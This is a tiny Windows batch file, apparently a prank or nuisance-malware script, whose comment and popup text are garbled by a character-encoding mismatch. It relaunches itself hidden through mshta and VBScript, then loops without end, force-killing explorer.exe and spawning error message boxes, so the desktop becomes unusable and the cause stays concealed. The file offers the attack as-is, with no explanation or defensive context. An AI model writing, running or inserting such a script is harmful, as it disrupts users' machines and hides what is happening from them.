::�w�w�]��ANSI�s�X
@echo off
if "%1" == "h" goto g
mshta vbscript:createobject("wscript.shell").run("""%~f0"" h",0)(window.close)&&exit 
:g
taskkill /f /IM explorer.exe
start mshta vbscript:msgbox("�A���q�����r�F",16)(window.close)
goto g